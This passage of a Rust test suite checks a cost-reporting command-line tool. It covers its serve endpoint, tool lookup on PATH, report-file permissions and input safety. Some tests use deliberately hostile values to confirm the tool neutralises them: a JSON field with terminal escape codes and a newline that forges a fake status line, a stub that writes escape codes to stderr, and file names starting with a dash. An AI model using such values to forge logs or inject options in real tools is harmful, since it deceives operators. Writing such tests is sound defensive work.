            b"{\"level\":\"error\",\"msg\":\"disk full\",\"host\":\"a\"}\n",
        );
        let mut cmd = cmd_with(&["report", "--tool", "auto", "--input"]);
        cmd.arg(&input).arg("--log-bill").arg(&log);
        let output = run_cmd(cmd);
        let err = text(&output.stderr);
        assert!(output.status.success(), "stderr: {err}");
        assert!(text(&output.stdout).contains("# log-bill teardown"));
    }

    #[test]
    fn serve_survives_a_char_cut_by_the_sniff_window() {
        let scratch = Scratch::new();
        let log = json_stub(&scratch, "log-bill", &LOG_JSON.replace("TEXT", "disk full"));
        let other = json_stub(&scratch, "other", "{}");
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_cost-check"));
        cmd.args(["serve", "--bind", "127.0.0.1:0"])
            .arg("--ci-bill")
            .arg(&other)
            .arg("--log-bill")
            .arg(&log)
            .arg("--dd-metric-bill")
            .arg(&other)
            .arg("--rum-meter")
            .arg(&other)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let mut child = cmd.spawn().expect("serve");
        let mut stdout = child.stdout.take().expect("stdout");
        let mut stderr = child.stderr.take().expect("stderr");
        let mut line = Vec::new();
        let mut byte = [0u8; 1];
        while stdout.read(&mut byte).map(|n| n == 1).unwrap_or(false) && byte[0] != b'\n' {
            line.push(byte[0]);
        }
        let url = String::from_utf8_lossy(&line).into_owned();
        let port: u16 = url
            .trim()
            .trim_start_matches("http://127.0.0.1:")
            .trim_end_matches('/')
            .parse()
            .unwrap_or_else(|_| panic!("geen adres: {url:?}"));
        let export = String::from_utf8(jsonl_cut_inside("日", 8191)).unwrap();
        let body = format!(
            "--cc\r\nContent-Disposition: form-data; name=\"tool\"\r\n\r\nlog-bill\r\n--cc\r\nContent-Disposition: form-data; name=\"export\"; filename=\"app.jsonl\"\r\n\r\n{export}\r\n--cc--\r\n"
        );
        let request = format!(
            "POST /report HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nContent-Type: multipart/form-data; boundary=cc\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
            body.len()
        );
        let mut client = TcpStream::connect(("127.0.0.1", port)).expect("verbind");
        client
            .set_read_timeout(Some(Duration::from_secs(20)))
            .unwrap();
        client.write_all(request.as_bytes()).unwrap();
        let mut buf = Vec::new();
        let _ = client.read_to_end(&mut buf);
        let response = String::from_utf8_lossy(&buf).into_owned();
        // serve keeps listening after the request; a panic would have ended it.
        thread::sleep(Duration::from_millis(200));
        let running = child.try_wait().expect("wait").is_none();
        let _ = child.kill();
        let _ = child.wait();
        let mut err = Vec::new();
        let _ = stderr.read_to_end(&mut err);
        let err = text(&err);
        assert!(!err.contains("panicked"), "{err}\n{response}");
        assert!(running, "serve stopte: {err}\n{response}");
        assert!(response.contains("200 OK"), "{response}\n{err}");
        assert!(response.contains("# log-bill teardown"), "{response}");
    }

    fn assert_one_clean_line(output: &Output) {
        assert_exit_two(output);
        let err = text(&output.stderr);
        assert!(
            !err.chars().any(|c| c.is_control() && c != '\n'),
            "stuurteken in stderr: {err:?}"
        );
        assert_eq!(err.lines().count(), 1, "meer dan een regel: {err:?}");
        assert!(err.ends_with('\n'), "{err:?}");
        assert!(err.starts_with("cost-check: "), "{err:?}");
    }

    #[test]
    fn a_hostile_tool_field_is_one_escaped_line_on_stderr() {
        let scratch = Scratch::new();
        let json = scratch.write(
            "hostile.json",
            br#"{"schema_version":1,"tool":"x\u001b[31m\u0007\ncost-check: alles goed"}"#,
        );
        let output = run(&[
            "render",
            "--tool",
            "log-bill",
            "--json",
            json.to_str().expect("pad"),
        ]);
        assert_one_clean_line(&output);
    }

    #[test]
    fn the_stderr_of_a_failing_tool_is_one_escaped_line() {
        let scratch = Scratch::new();
        let usage = scratch.write("usage.csv", USAGE);
        let stub = scratch.stub(
            "ci-bill",
            "printf 'kapot \\033[31m\\007rood\\ncost-check: nep melding\\n' >&2\nexit 3\n",
        );
        let mut cmd = cmd_with(&["report", "--tool", "ci-bill", "--input"]);
        cmd.arg(&usage)
            .arg("--ci-bill")
            .arg(&stub)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert_one_clean_line(&output);
        assert!(text(&output.stderr).contains("stopte met code 3"));
    }

    #[test]
    fn the_tool_is_found_next_to_the_program_and_on_path() {
        let scratch = Scratch::new();
        let home = scratch.path().join("bin");
        fs::create_dir(&home).unwrap();
        let program = home.join("cost-check");
        fs::copy(env!("CARGO_BIN_EXE_cost-check"), &program).unwrap();
        let usage = scratch.write("usage.csv", USAGE);
        let json = scratch.write("ci.json", &fs::read(ci_json()).unwrap());
        let stub_body = format!("cat '{}'\n", json.display());
        let clean = |cmd: &mut Command| {
            for key in [
                "COST_CHECK_CI_BILL",
                "COST_CHECK_LOG_BILL",
                "COST_CHECK_DD_METRIC_BILL",
                "COST_CHECK_RUM_METER",
            ] {
                cmd.env_remove(key);
            }
        };

        // Next to the program, with no PATH entry for it.
        let beside = scratch.stub("ci-bill", &stub_body);
        fs::rename(&beside, home.join("ci-bill")).unwrap();
        let mut cmd = Command::new(&program);
        clean(&mut cmd);
        cmd.env("PATH", "/usr/bin:/bin")
            .args(["report", "--tool", "ci-bill", "--input"])
            .arg(&usage)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
        assert_eq!(text(&output.stdout), page_without_fix());
        fs::remove_file(home.join("ci-bill")).unwrap();

        // On PATH, with the program somewhere else.
        let elsewhere = scratch.path().join("elsewhere");
        fs::create_dir(&elsewhere).unwrap();
        let on_path = scratch.stub("ci-bill", &stub_body);
        fs::rename(&on_path, elsewhere.join("ci-bill")).unwrap();
        let mut cmd = Command::new(&program);
        clean(&mut cmd);
        cmd.env("PATH", format!("{}:/usr/bin:/bin", elsewhere.display()))
            .args(["report", "--tool", "ci-bill", "--input"])
            .arg(&usage)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
        assert_eq!(text(&output.stdout), page_without_fix());

        // Nowhere: the error names the missing tool and the run does not pass.
        fs::remove_file(elsewhere.join("ci-bill")).unwrap();
        let mut cmd = Command::new(&program);
        clean(&mut cmd);
        cmd.env("PATH", "/usr/bin:/bin")
            .args(["report", "--tool", "ci-bill", "--input"])
            .arg(&usage)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert_exit_two(&output);
        assert!(
            text(&output.stderr).contains("binary ontbreekt"),
            "{}",
            text(&output.stderr)
        );
    }

    /// A stub for `log-bill`: it fails unless the export is the last argument,
    /// the one after `--`, and a file that exists.
    const STRICT_LOG: &str = "prev=''; last=''\nfor a in \"$@\"; do before=\"$prev\"; prev=\"$a\"; last=\"$a\"; done\n[ \"$before\" = '--' ] || { echo 'no -- before the export' >&2; exit 4; }\n[ -f \"$last\" ] || { echo 'file is not readable' >&2; exit 3; }\n";

    #[test]
    fn a_path_that_starts_with_a_dash_is_a_file() {
        let scratch = Scratch::new();
        scratch.write("-x.log", b"ERROR disk full\n");
        let json = scratch.write("log.json", LOG_JSON.replace("TEXT", "disk full").as_bytes());
        let log = scratch.stub(
            "log-bill",
            &format!("{STRICT_LOG}cat '{}'\n", json.display()),
        );
        let mut cmd = cmd_with(&["report", "--tool", "log-bill", "--input=-x.log"]);
        cmd.arg("--log-bill").arg(&log).current_dir(scratch.path());
        let output = run_cmd(cmd);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
        assert!(text(&output.stdout).starts_with("# log-bill teardown\n"));

        // ci-bill takes the export after a flag, so the value is glued to it.
        let ci = scratch.stub(
            "ci-bill",
            &format!(
                "for a in \"$@\"; do case \"$a\" in --usage=*) [ -f \"${{a#--usage=}}\" ] || exit 3; ok=1;; esac; done\n[ \"$ok\" = 1 ] || exit 4\ncat '{}'\n",
                ci_json().display()
            ),
        );
        scratch.write("-u.csv", USAGE);
        let mut cmd = cmd_with(&["report", "--tool", "ci-bill", "--input=-u.csv"]);
        cmd.arg("--ci-bill").arg(&ci).current_dir(scratch.path());
        let output = run_cmd(cmd);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    }

    #[cfg(target_os = "linux")]
    #[test]
    fn a_path_with_a_byte_that_is_not_utf8_stays_the_real_path() {
        let scratch = Scratch::new();
        use std::os::unix::ffi::OsStrExt;
        let name = std::ffi::OsStr::from_bytes(b"caf\xe9.log");
        fs::write(scratch.path().join(name), b"ERROR disk full\n").unwrap();
        let json = scratch.write("log.json", LOG_JSON.replace("TEXT", "disk full").as_bytes());
        let log = scratch.stub(
            "log-bill",
            &format!("{STRICT_LOG}cat '{}'\n", json.display()),
        );
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_cost-check"));
        cmd.args(["report", "--tool", "log-bill", "--input"])
            .arg(scratch.path().join(name))
            .arg("--log-bill")
            .arg(&log)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        let output = run_cmd(cmd);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
    }

    /// The permission test: it needs Unix modes, so it only runs on Unix.
    #[test]
    fn the_report_file_is_a_normal_file_and_no_temp_file_stays() {
        use std::os::unix::fs::PermissionsExt;
        let scratch = Scratch::new();
        let usage = scratch.write("usage.csv", USAGE);
        let stub = scratch.stub_that_prints(&ci_json());
        let out = scratch.path().join("rapport.md");
        let output = run(&[
            "report",
            "--tool",
            "ci-bill",
            "--input",
            usage.to_str().unwrap(),
            "--ci-bill",
            stub.to_str().unwrap(),
            "--out",
            out.to_str().unwrap(),
        ]);
        assert!(output.status.success(), "stderr: {}", text(&output.stderr));
        let mode = fs::metadata(&out).unwrap().permissions().mode();
        assert_eq!(mode & 0o111, 0, "het rapport is uitvoerbaar: {mode:o}");
        let leftovers: Vec<_> = fs::read_dir(scratch.path())
            .unwrap()
            .filter_map(Result::ok)
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| n.starts_with(".cost-check-"))
            .collect();
        assert!(leftovers.is_empty(), "{leftovers:?}");
    }
}
